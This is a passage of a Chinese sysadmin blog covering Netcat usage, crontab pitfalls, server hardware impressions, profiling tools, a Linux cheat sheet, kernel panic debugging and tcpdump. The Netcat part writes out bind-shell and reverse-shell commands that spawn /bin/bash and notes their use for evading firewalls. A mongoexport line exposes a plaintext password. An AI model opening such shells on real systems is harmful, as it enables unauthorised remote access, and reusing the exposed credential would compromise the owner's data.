+<p>使用mcrypt工具加密数据。</p>
+
+<p>SERVER B:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>mcrypt –flush –bare -F -q -m ecb &lt; file.txt | nc -l 1234</span></code></pre></td></tr></table></div></figure>
+
+
+<p>使用mcrypt工具解密数据。</p>
+
+<p>以上两个命令会提示需要密码，确保两端使用相同的密码。</p>
+
+<p>这里我们是使用mcrypt用来加密，使用其它任意加密工具都可以。</p>
+
+<h4>克隆一个设备</h4>
+
+<p>如果你已经安装配置一台Linux机器并且需要重复同样的操作对其他的机器，而你不想在重复配置一遍。不在需要重复配置安装的过程，只启动另一台机器的一些引导可以随身碟和克隆你的机器。</p>
+
+<p>克隆Linux PC很简单，假如你的系统在磁盘/dev/sda上</p>
+
+<p>SERVER A:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$dd if=/dev/sda | nc -l 1567</span></code></pre></td></tr></table></div></figure>
+
+
+<p>SERVER B:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$nc -n 192.168.100.100 1567 | dd of=/dev/sda</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>打开一个shell</h4>
+
+<p>没有telnet和ssh的时候，可以使用Netcat创建远程shell。</p>
+
+<p>假设你的Netcat支持 -c -e 参数(默认 Netcat)</p>
+
+<p>SERVER A:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$nc -l 1567 -e /bin/bash -i</span></code></pre></td></tr></table></div></figure>
+
+
+<p>SERVER B:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$nc 192.168.100.100 1567</span></code></pre></td></tr></table></div></figure>
+
+
+<p>这里我们已经创建了一个Netcat服务器并且表示当它连接成功时执行/bin/bash</p>
+
+<p>假如Netcat 不支持-c 或者 -e 参数（openbsd Netcat）,我们仍然能够创建远程shell</p>
+
+<p>SERVER A:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$mkfifo /tmp/tmp_fifo$cat /tmp/tmp_fifo | /bin/sh -i 2&gt;&1 | nc -l 1567 &gt; /tmp/tmp_fifo</span></code></pre></td></tr></table></div></figure>
+
+
+<p>这里我们创建了一个fifo文件，然后使用管道命令把这个fifo文件内容定向到shell 2>&amp;1中。是用来重定向标准错误输出和标准输出，然后管道到Netcat 运行的端口1567上。至此，我们已经把Netcat的输出重定向到fifo文件中。</p>
+
+<p>说明：从网络收到的输入写到fifo文件中</p>
+
+<ul>
+<li><p>cat 命令读取fifo文件并且其内容发送给sh命令</p></li>
+<li><p>sh命令进程收到输入并把它写回到Netcat。</p></li>
+<li><p>Netcat 通过网络发送输出到client</p></li>
+</ul>
+
+
+<p>至于为什么会成功是因为管道使命令平行执行，fifo文件用来替代正常文件，因为fifo使读取等待而如果是一个普通文件，cat命令会尽快结束并开始读取空文件。</p>
+
+<h4>反向shell</h4>
+
+<p>反向shell是人曾经在客户端打开的shell。反向shell这样命名是因为不同于其他配置，这里服务器使用的是由客户提供的服务。</p>
+
+<p>服务端</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$nc -l 1567</span></code></pre></td></tr></table></div></figure>
+
+
+<p>在客户端，简单地告诉Netcat在连接完成后，执行shell。</p>
+
+<p>客户端</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$nc 192.168.100.100 -e /bin/bash</span></code></pre></td></tr></table></div></figure>
+
+
+<p>现在，什么是反向shell的特别之处呢</p>
+
+<p>反向shell经常被用来绕过防火墙的限制，如阻止入站连接。例如，我有一个专用IP地址为192.168.100.100，我使用代理服务器连接到外部网络。如果我想从网络外部访问 这台机器如1.2.3.4的shell，那么我会用反向shell用于这一目的。</p>
+
+<h4>指定源端口</h4>
+
+<p>假设你的防火墙过滤除25端口外其它所有端口，你需要使用-p选项指定源端口。</p>
+
+<p>服务器端</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$nc -l 1567</span></code></pre></td></tr></table></div></figure>
+
+
+<p>客户端</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$nc 172.31.100.7 1567 -p 25</span></code></pre></td></tr></table></div></figure>
+
+
+<p>使用1024以内的端口需要root权限。</p>
+
+<p>该命令将在客户端开启25端口用于通讯，否则将使用随机端口。</p>
+
+<h4>指定源地址</h4>
+
+<p>假设你的机器有多个地址，希望明确指定使用哪个地址用于外部数据通讯。我们可以在Netcat中使用-s选项指定ip地址。</p>
+
+<p>服务器端</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$nc -u -l 1567 &lt; file.txt</span></code></pre></td></tr></table></div></figure>
+
+
+<p>客户端</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$nc -u 172.31.100.7 1567 -s 172.31.100.5 &gt; file.txt</span></code></pre></td></tr></table></div></figure>
+
+
+<p>该命令将绑定地址172.31.100.5。</p>
+
+<h2>参考:</h2>
+
+<p><a href="http://os.51cto.com/art/201304/388721.htm">http://os.51cto.com/art/201304/388721.htm</a></p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/08/07/crontab-eight-comm/">Crontab Eight Comm</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2015-08-07T18:11:11+08:00" pubdate data-updated="true">Aug 7<span>th</span>, 2015</time>
+        
+           | <a href="/blog/2015/08/07/crontab-eight-comm/#disqus_thread"
+             data-disqus-identifier="http://memoryboxes.github.io/blog/2015/08/07/crontab-eight-comm/">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>网上收集，多次踩坑，立此存照</p>
+
+<h2>crontab八诫</h2>
+
+<ul>
+<li><p>不要假定cron知道所需要的特殊环境，它其实并不知道。所以你要保证在shelll脚本中提供所有必要的路径和环境变量，除了一些自动设置的全局变量。所以注意如下2点：</p>
+
+<ul>
+<li>脚本中涉及文件路径时写全局路径；</li>
+<li><p>脚本执行要用到java或其他环境变量时，通过source命令引入环境变量，如：</p>
+
+<pre><code>  #!/bin/sh
+  source /etc/profile
+  export RUN_CONF=/home/xxxx/boss.conf
+  /usr/local/jboss-4.0.5/bin/run.sh -c mev &amp;
+</code></pre></li>
+</ul>
+</li>
+<li><p>当手动执行脚本OK，但是crontab死活不执行时。这时必须大胆怀疑是环境变量惹的祸，并可以尝试在crontab中直接引入环境变量解决问题。如：</p>
+
+<pre><code>  0 * * * * . /etc/profile;/bin/sh /var/www/java/audit_no_count/bin/restart_audit.sh
+</code></pre></li>
+<li><p>新创建的cron job，不会马上执行，至少要过2分钟才执行。如果重启cron则马上执行。</p></li>
+<li><p>每条 JOB 执行完毕之后，系统会自动将输出发送邮件给当前系统用户。日积月累，非常的多，甚至会撑爆整个系统。所以每条 JOB 命令后面进行重定向处理是非常必要的: <code>&gt;/dev/null 2&gt;&amp;1</code>, 前提是对 Job 中的命令需要正常输出已经作了一定的处理, 比如追加到某个特定日志文件。</p></li>
+<li><p>当crontab突然失效时，可以尝试<code>/etc/init.d/crond restart</code>解决问题。或者查看日志看某个job有没有执行/报错 <code>tail -f /var/log/cron</code>。</p></li>
+<li><p>千万别乱运行 <code>crontab -r</code>。它从Crontab目录（/var/spool/cron）中删除用户的Crontab文件。删除了该用户的所有crontab都没了。</p></li>
+<li><p>在crontab中%是有特殊含义的，表示换行的意思。如果要用的话必须进行转义 <code>\%</code>，如经常用的<code>date '+%Y%m%d'</code>在crontab里是不会执行的，应该换成 <code>date '+\%Y\%m\%d'</code>。</p></li>
+<li><p>永远要手工验证一下crontab中的命令</p></li>
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/08/07/zhuang-fu-wu-qi-ou-de/">装服务器偶得</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2015-08-07T09:05:30+08:00" pubdate data-updated="true">Aug 7<span>th</span>, 2015</time>
+        
+           | <a href="/blog/2015/08/07/zhuang-fu-wu-qi-ou-de/#disqus_thread"
+             data-disqus-identifier="http://memoryboxes.github.io/blog/2015/08/07/zhuang-fu-wu-qi-ou-de/">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>最近工作需要，连续装了不少服务器。虽然做系统真是没什么技术含量的事，但做多了还是有些想法，记录下。</p>
+
+<h2>硬件tips</h2>
+
+<h4>Dell</h4>
+
+<ul>
+<li><p>Dell PowerEdge 2950  2U</p></li>
+<li><p>Dell PowerEdge R610 2U</p></li>
+<li><p>Dell PowerEdge R630 1U</p></li>
+<li><p>Dell PowerEdge R710  1U</p></li>
+<li><p>Dell PowerEdge R720xd 1U</p></li>
+</ul>
+
+
+<p>对Dell 系列的服务器印象一直很好，皮实耐折腾， R系列的兼容性也很好，开机启动速度也算是凑合。</p>
+
+<p>但是最近发现一个问题，就是R630 系列的做了Raid5之后，分XFS分区，用clonezilla做镜像的时候非常慢。如果要调大xfs的blocksize，又需要重新编译内核，比较麻烦。</p>
+
+<h4>HP</h4>
+
+<ul>
+<li><p>HP ProLiant DL380 Gen6  2U</p></li>
+<li><p>HP ProLiant DL360 Gen9  1U</p></li>
+</ul>
+
+
+<p>网上对惠普 DL360系列的机器评价很好，但我对它印象不佳。</p>
+
+<p>首先说设计，前面板只有一个usb接口，一般做系统的时候，条件简陋点，需要一个USB光驱，一套键鼠，光驱可以插后面，但是键鼠插后面太麻烦了，所以我比较喜欢前面板有两个USB接口的机器。</p>
+
+<p>然后HP 的BIOS 自检极其缓慢，是Dell的1.5倍。很扯。</p>
+
+<p>然后DL360系列，如果安装centos系，自编译内核的话，需要自己编译Raid驱动，这个极其不爽，而且惠普的官网找驱动，真是费力，而且kernel编出来总有种种小毛病。</p>
+
+<p>比较值得赞扬的是 Gen9以后的机器，做Raid的界面做的挺漂亮的。但是极其坑爹的是，BIOS自检过了以后，没有明确提示按F8进Raid，一定要到网上查。而且我觉得HP的BIOS管理引导做的很啰嗦，要进三层才能看到功能。</p>
+
+<h4>Lenovo</h4>
+
+<ul>
+<li>Lenovo System x3550 M5</li>
+</ul>
+
+
+<p>公司里说进了IBM的服务器，开机一看，打的Lenovo的LOGO，好吧，原来联想已经做到这个程度了。</p>
+
+<p>机器的配置不错，说说吐槽点:</p>
+
+<ul>
+<li><p>首先自检的速度又慢了一个档次，重启一遍可以买个包子吃了。</p></li>
+<li><p>BIOS 工具又是层层深入，做Raid估计要进入5级菜单才能搞定。</p></li>
+<li><p>不支持centos5系了，同事打电话问客服，号称没测过centos6.4以下的，真是理直气壮</p></li>
+</ul>
+
+
+<h2>吐槽</h2>
+
+<ul>
+<li><p>所有的机器做Raid的那套东西大同小异，控制器都是一家的。但是界面包装有好有坏，按靠谱程度排序  HP>DELL>Lenovo</p></li>
+<li><p>做好机器后，总是需要在前面贴个标签，现在机器越做越小，最直观的感觉就是前面贴个标签都找不到地方了。看人家管理，有把标签挂在上面的，有在LED屏上编号的，都不方便。为什么没有厂商在前面设计一个小卡片槽，专门放标签纸呢，我估计这个小功能肯定会讨得很多人欢心。</p></li>
+<li><p>我装服务器，到现在为止一个最大的吐槽点，没有见过一家厂商解决过。就是机器自检的时候，很多显示器兼容性不好，会把左边屏幕的输出吃掉一截。最坑爹的是，每家的BIOS输出都是紧靠左边打出来的，往往会有  <code>F2=Setup</code> 前面的 <code>F2</code>被吃掉的情况，他们就不知道把输出居中一点，我只能说这些公司真是僵化了，下一个诺基亚，说不定就是惠普。</p></li>
+<li><p>最后就是所有的所谓大公司，官网做的都和微软帮助一个style，就是我按照提示一步步点下去，又回到开始了，它还问我&#8221;有帮助吗?&ldquo;，已经吐槽无力了。在我看来，这些所谓的高科技大公司，其实已经比很多传统行业还恐龙了，看看他们数十年如一日的BIOS就知道了。只不过积累在那里，让他们产生自我感觉良好的错觉。这些公司死是早晚的事。</p></li>
+</ul>
+
+
+<h2>软件tips</h2>
+
+<h4>centos5 &ndash;> centos6 &ndash;> centos7</h4>
+
+<p>redhat系的的安装界面 一代比一代漂亮，也一代比一代依赖鼠标。</p>
+
+<ul>
+<li>centos5不支持鼠标，熟练后完全依赖键盘一路打下去，很方便</li>
+<li>centos6 界面很朴素，但比较好用，键盘鼠标都能不是很痛苦的搞定</li>
+<li>centos7 界面比较花哨了，都做到一个安装界面里，鼠标操作很方便，键盘操作很痛苦，我曾经在没有鼠标的环境下，硬是花了半个小时装了个centos7.1U</li>
+</ul>
+
+
+<p>孰是孰非，让后来人评说。</p>
+
+<h4>xfs resize blocksize</h4>
+
+<ul>
+<li>xfs做文件系统的时候，试图mkfs.xfs -b &mdash;size=xxx ，不生效，默认redhat系的page_size设置的就是4K，xfs的blocksize必须不大于这个size，如果要设大，只能重新编译kernel</li>
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/06/28/linux-profile-and-debug-tools-of-performance/">Linux Profile and Debug Tools of Performance</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2015-06-28T16:52:15+08:00" pubdate data-updated="true">Jun 28<span>th</span>, 2015</time>
+        
+           | <a href="/blog/2015/06/28/linux-profile-and-debug-tools-of-performance/#disqus_thread"
+             data-disqus-identifier="http://memoryboxes.github.io/blog/2015/06/28/linux-profile-and-debug-tools-of-performance/">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h4>用perf工具统计系统调用</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>perf top</span></code></pre></td></tr></table></div></figure>
+
+
+<p>或者统计一段时间内的调用</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>perf record -a -g -F 1000 sleep 30
+</span><span class='line'>perf report -g</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>用strace 追踪某个进程的调用</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>strace -c ls</span></code></pre></td></tr></table></div></figure>
+
+
+<p>或者attach一个进程</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>strace -c -p pid</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>查看磁盘调用</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>lsof -p pid</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>磁盘负载</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>iostat -x 5 -m</span></code></pre></td></tr></table></div></figure>
+
+
+<p>整体负载统计</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>vmstat 5 </span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/06/19/linux-cheat-sheet/">Linux Cheat Sheet</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2015-06-19T09:43:07+08:00" pubdate data-updated="true">Jun 19<span>th</span>, 2015</time>
+        
+           | <a href="/blog/2015/06/19/linux-cheat-sheet/#disqus_thread"
+             data-disqus-identifier="http://memoryboxes.github.io/blog/2015/06/19/linux-cheat-sheet/">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>收集linux下需要多次google的命令</p>
+
+<h2>编码问题</h2>
+
+<ul>
+<li>utf16 > utf8</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>iconv -f UTF-16 -t UTF-8 file_name</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>web开发命令</h2>
+
+<ul>
+<li>curl post 一个json文件</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>curl -H "Content-Type: application/json"--data @body.json http://localhost:8080/ui/webapp/conf</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>curl post 一个json字符串</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>curl -H "Content-Type: application/json"-d '{"username":"xyz","password":"xyz"}' http://localhost:3000/api/login</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>系统时间</h2>
+
+<ul>
+<li>centos6系列修改时区</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ln -s /usr/share/zoneinfo/Asia/Shanghai /etc/localtime
+</span><span class='line'>vim /etc/sysconfig/clock
+</span><span class='line'>ZONE="Asia/Shanghai"</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>centos7系列修改时区</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>timedatectl list-timezones | grep Asia
+</span><span class='line'>timedatectl set-timezone Asia/Shanghai</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>设置系统时间</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>date +"%Y%m%d%H%M%S"</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>系统状态</h2>
+
+<ul>
+<li>查看系统占用句柄数</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>lsof -n|awk '{print $2}'|sort|uniq -c|sort -nr|more</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>程序</h2>
+
+<ul>
+<li>mongo导出</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>mongoexport  -u crossflow -p '0701!1523#SH' -authenticationDatabase admin -d bpc -c main_app_datapath -o main_app_datapath.json</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>shell 处理</h2>
+
+<ul>
+<li>获取当前路径</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>export CURRENT_PATH=$(cd "$(dirname "$0")"; pwd)</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>检查CPU load</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>CURRENT_LOAD=`top -b -n 1|grep 'load average'|awk '{print $12}'|sed 's/,//'`
+</span><span class='line'>declare -i current_load=${CURRENT_LOAD%.*}</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>find 匹配多个pattern</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>find /usr/lib64 -name '*.so' -o -name '*.so.1'</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>文本处理</h2>
+
+<ul>
+<li>根据某个字段做uniq</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sort -u -t, -k1 file</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/06/07/debug-kernel-panic-in-centos/">Debug Kernel Panic in Centos</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2015-06-07T09:22:34+08:00" pubdate data-updated="true">Jun 7<span>th</span>, 2015</time>
+        
+           | <a href="/blog/2015/06/07/debug-kernel-panic-in-centos/#disqus_thread"
+             data-disqus-identifier="http://memoryboxes.github.io/blog/2015/06/07/debug-kernel-panic-in-centos/">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>当你面对一台新机器，出于某些原因(不是闲的慌)不得不自己编译一个内核时，会碰上kernel panic。</p>
+
+<p>kernel panic很让人心烦，启动时的panic更让人烦，没有挂上硬盘，没有任何log的panic尤其让人烦。</p>
+
+<p>提供几个解决问题的瞎搞方法: （以下内容针对于redhat系，但大部分方法是通用的）</p>
+
+<h4>判断引起panic的环节</h4>
+
+<p>简单描述下启动流程:</p>
+
+<pre><code>1 Power On                                 Maybe Err:Worlds Collides
+2 BIOS                                     Maybe Err:Worlds Collides
+3 Load Grub From MBR                       Maybe Err:See nothing
+4 load Grub and show it                    Maybe Err:Grub loads failed
+5 Grub reads menu.list                     Maybe Err:Grub loads failed
+6 Grub loads kernel image                  Maybe Err:Grub loads failed
+7 kernel mounts root filesystem            Maybe Err:PANIC
+8 kernel runs init                         Maybe Err:PANIC
+9 init runs scripts to start               Maybe Err:PANIC
+</code></pre>
+
+<p>首先你要确认下是哪个环节引起的panic，如果你的log打得比较全，一般能根据蛛丝马迹判断是上面那个环节引起的问题。一般panic发生在step7，step8, step9环节当中。</p>
+
+<ul>
+<li><p>step9: 走到这里已经无大碍，无非是/etc/rc.sysinit 之流挂载了不该有的设备，启动了不知道神马的服务，可以直接在启动脚本中打各种log调试</p></li>
+<li><p>step8: 这个就比较棘手，一般是initramfs 解压后执行某些脚本报错，所幸是大部分都是init级别的，一般可以在grub的kernel后面加参数，挂载shell调，也可以直接用工具修改initramfs镜像中的文件，重新打包二分法定位</p></li>
+<li><p>step7: 也比较棘手，一般panic总要怀疑磁盘驱动，我感觉这个是导致panic的大户，另外如果屏幕没有东东输出，估计视频驱动也要鼓捣一番。</p></li>
+</ul>
+
+
+<p>下面针对 step7，step8级别的panic提供一些瞎搞手段</p>
+
+<h4>在kernel 参数中加入调试开关，关闭ACPI，selinux</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>  title CentOS (2.6.32-358.el6.x86_64)
+</span><span class='line'>          root (hd0,0)
+</span><span class='line'>          kernel /vmlinuz-2.6.32-358.el6.x86_64 ro root=/dev/mapper/vg_localhost-lv_root rd_NO_LUKS rd_NO_MD rd_LVM_LV=vg_localhost/lv_swap crashkernel=128M LANG=zh_CN.UTF-8 rd_LVM_LV=vg_localhost/lv_root  KEYBOARDTYPE=pc KEYTABLE=us rd_NO_DM debug selinux=0 acpi=0
+</span><span class='line'>          initrd /initramfs-2.6.32-358.el6.x86_64.img</span></code></pre></td></tr></table></div></figure>
+
+
+<p></p>
+
+<p>这是考验人品的时候，不管三七二十一，先把最有可能的问题点排除掉。另外redhat系的会在kernel后面加上 <code>rhgb quiet</code> 之类的参数，统统去掉，开机的时候好好盯着屏幕看看，有没有可疑的东东输出。 因为系统可能会在短时间内输出大量log而没有记录，你需要设置一下输出log的速率和暂停时机，更详细的参数可以在这里找到:</p>
+
+<p><a href="https://wiki.archlinux.org/index.php/Boot_debugging">https://wiki.archlinux.org/index.php/Boot_debugging</a></p>
+
+<h4>在kernel 参数中加入dracut的调试开关</h4>
+
+<p>redhat系后期采用了dracut构建 initrd镜像，关于dracut的手册在这里:</p>
+
+<p><a href="http://people.redhat.com/harald/dracut-rhel6.html#lsinitrd">http://people.redhat.com/harald/dracut-rhel6.html#lsinitrd</a></p>
+
+<p>调试开关在这里:</p>
+
+<p><a href="https://fedoraproject.org/wiki/How_to_debug_Dracut_problems">https://fedoraproject.org/wiki/How_to_debug_Dracut_problems</a></p>
+
+<p>你可以设定rdshell，在panic之后跳入dracut提供的shell，打dmesg看看log信息。</p>
+
+<h3>最后的最后，实在不知道为啥了，而且你很闲，可以考虑启动时加串口设备调试</h3>
+
+<h4>一些tooltip</h4>
+
+<ul>
+<li><p>编译kernel的时候，make menuconfig，3.10以后的内核支持搜索某个开关后按数字键直接跳到那个开关的设置项中，这个很有用</p></li>
+<li><p>redhat系用dracut构建initrd，配置文件默认在 /usr/share/dracut/ ，如果你懒得改 initramfs，可以直接修改里面的配置文件，然后重新make install即可</p></li>
+<li><p>有时候你不好确认根文件系统挂载到哪里了，可以参考这里:</p></li>
+</ul>
+
+
+<p><a href="http://free-electrons.com/blog/find-root-device/">http://free-electrons.com/blog/find-root-device/</a></p>
+
+<p>其它参考资料:</p>
+
+<p><a href="http://www.tuxradar.com/content/how-fix-linux-boot-problems">http://www.tuxradar.com/content/how-fix-linux-boot-problems</a></p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/05/08/tcpdump-commands/">Tcpdump Commands</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2015-05-08T20:06:22+08:00" pubdate data-updated="true">May 8<span>th</span>, 2015</time>
+        
+           | <a href="/blog/2015/05/08/tcpdump-commands/#disqus_thread"
+             data-disqus-identifier="http://memoryboxes.github.io/blog/2015/05/08/tcpdump-commands/">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>tcpdump 的抓包保存到文件的命令参数是-w xxx.cap</p>
+
+<ul>
+<li>抓eth1的包</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>tcpdump -i eth1 -w /tmp/xxx.pcap</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>抓eth1的包，用ip+port的形式显示通信对</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>tcpdump -i eth1 -nn -w /tmp/xxx.pcap</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>抓 192.168.1.123的包</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>tcpdump -i eth1 host 192.168.1.123 -w /tmp/xxx.cap</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>抓192.168.1.123的80端口的包</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>tcpdump -i eth1 host 192.168.1.123 and port 80 -w /tmp/xxx.cap</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>抓192.168.1.123的icmp的包</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
